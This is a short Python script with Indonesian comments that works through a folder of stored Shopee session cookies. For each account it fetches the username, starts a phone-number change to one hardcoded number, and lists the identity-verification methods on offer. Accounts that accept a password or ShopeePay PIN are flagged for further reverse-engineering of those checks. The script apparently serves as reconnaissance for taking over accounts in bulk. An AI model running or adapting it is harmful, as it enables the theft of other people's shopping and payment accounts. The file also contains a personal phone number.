# -*- coding: utf-8 -*-
"""rea_ivs3.py — cek method IVS di SEMUA cookie yang ada.

Cari akun yang menawarkan PASSWORD (2) / SHOPEEPAY_PIN (10),
lalu RE verify_password / verify_pin dari akun itu.
"""
import sys
import json
import glob

sys.path.insert(0, "/root/shopee-verify")
import changenumfast as c

IVS_TYPE = {1: "OTP", 2: "PASSWORD", 3: "SHOPEEPAY", 5: "AUTH_LINK",
            6: "EMAIL", 7: "QR", 8: "EMAIL_LINK", 10: "NEW_SHOPEEPAY_PIN",
            11: "WHATSAPP_LINK", 14: "SECURITY_QUESTIONS",
            15: "SECURITY_EMAIL", 20: "DEVICE_TOKEN", 100: "SKIP"}

PH = "6282374455953"
EV = 2

files = sorted(set(glob.glob("/root/shopee-verify/ck_*.txt")
                   + glob.glob("/root/shopee-verify/test_ck.txt")))
print("=" * 70)
print(f"COOKIE DITEMUKAN: {len(files)}")
print("=" * 70)

results = []
for f in files:
    try:
        ck = open(f).read().strip()
    except Exception:
        continue
    if not c.is_cookie(ck):
        continue
    a = c.Api(ck)
    acc = a.get("/api/v4/account/basic/get_account_info")
    user = (acc.get("data") or {}).get("username") or f"err{acc.get('error')}"
    ini = a.post("/api/v4/account/management/change_phone_init_v2",
                 {"phone": PH, "seq_no": None})
    d = ini.get("data") or {}
    ivs = d.get("ivs_required")
    ut = d.get("ivs_utoken") or ""

    line = f"{f.split('/')[-1]:22s} user={user:16s} ivs={ivs}"

    if ivs and ut:
        m = a.post("/api/v4/anti_fraud/ivs/methods",
                   {"event": EV, "u_token": ut})
        ms = m.get("data") or []
        types = [mm.get("type") for mm in ms]
        names = [IVS_TYPE.get(t, str(t)) for t in types]
        line += f" methods={names} err={m.get('error')}"
        results.append((f, user, types, ut))
    print(line)

print("\n" + "=" * 70)
print("AKUN DENGAN PASSWORD / PIN")
print("=" * 70)
found = False
for f, user, types, ut in results:
    pw = 2 in types
    pin = 10 in types
    if pw or pin:
        found = True
        print(f"  ✅ {f} user={user} "
              f"{'PASSWORD ' if pw else ''}{'SHOPEEPAY_PIN' if pin else ''}")
        print(f"     types={types}")
if not found:
    print("  ❌ Tidak ada akun yang menawarkan PASSWORD/PIN saat ini.")
    print("  Semua hanya EMAIL_LINK / OTP.")
